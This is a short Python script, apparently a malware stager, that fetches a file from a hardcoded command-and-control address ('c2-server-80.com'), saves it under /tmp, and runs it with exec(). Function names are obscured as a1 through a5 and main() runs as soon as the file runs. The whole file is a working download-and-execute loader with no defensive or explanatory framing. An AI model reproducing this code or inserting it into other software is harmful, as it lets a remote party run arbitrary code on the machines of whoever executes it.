import requests
import os

def a1(u):
    r = requests.get(u)
    return r.text

def a2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def a3(fp):
    with open(fp, "r") as f:
        return f.read()

def a4(s):
    exec(s)

def a5(u, fp):
    cd = a1(u)
    a2(fp, cd)
    sc = a3(fp)
    a4(sc)

def main():
    c2_url = "http://c2-server-80.com/script.py"
    tmp_fl = "/tmp/script80.py"
    a5(c2_url, tmp_fl)

main()
